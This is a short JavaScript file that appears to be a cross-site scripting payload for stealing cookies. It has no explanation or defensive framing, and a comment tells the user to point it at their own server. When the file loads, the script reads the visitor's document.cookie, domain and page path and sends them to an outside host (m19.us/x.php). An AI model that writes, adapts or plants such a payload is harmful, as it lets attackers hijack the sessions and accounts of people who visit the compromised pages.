/** CHANGE THIS VALUE TO YOUR SERVER **/
var phoneHome = "http://m19.us/"; // leave trailing slash

function grabCookie()
{
  var xmlhttp;
  if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
    xmlhttp=new XMLHttpRequest();
  } else  { // code for IE6, IE5
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
  xmlhttp.onreadystatechange=function() {
    if (xmlhttp.readyState==4 && xmlhttp.status==200) {
      document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
    }
  }
  xmlhttp.open("GET",phoneHome+"x.php?c="+document.cookie+"&d="+document.domain+document.location.pathname,true);
  xmlhttp.send();
}

grabCookie();
